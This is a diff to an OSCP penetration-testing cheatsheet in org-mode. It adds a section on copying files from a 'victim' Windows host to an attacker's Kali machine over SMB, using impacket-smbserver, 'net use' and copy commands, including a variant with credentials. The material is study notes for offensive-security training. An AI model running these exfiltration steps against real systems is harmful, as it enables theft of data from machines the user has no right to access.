@@ -1,5 +1,35 @@
 #+TITLE: OSCP Cheatsheet
-#+AUTHOR: Leonardo Tamiano
+#+AUTHOR: Forked by Ethan Lacerenza  Author: Leonardo Tamiano
+
+* Transfer file via SMB 
+#+begin_example
+Make a smb share 
+----------------------
+from your kali
+-----------------------------
+`impacket-smbserver -smb2support <share_name> <path>`
+eg,
+`impacket-smbserver -smb2support test .`
+--------------------------------------------------
+then from victim,
+`net use \\<kali_ip>\test`
+
+then
+`PS> cp filename.txt \\kali_ip\test\`
+or
+`CMD > copy filename.txt \\kali_ip\test\`
+------------------
+-------------------
+if got error, try to make a share from your kali with username password
+`impacket-smbserver -smb2support test . -username df -password df`
+ 
+then from victim
+`net use \\kali_ip\test /u:df df`
+then
+`PS> cp filename.txt \\kali_ip\test\`
+or
+`CMD > copy filename.txt \\kali_ip\test\`
+  #+end_example
 
 * Reverse Shells
   shell upgrade
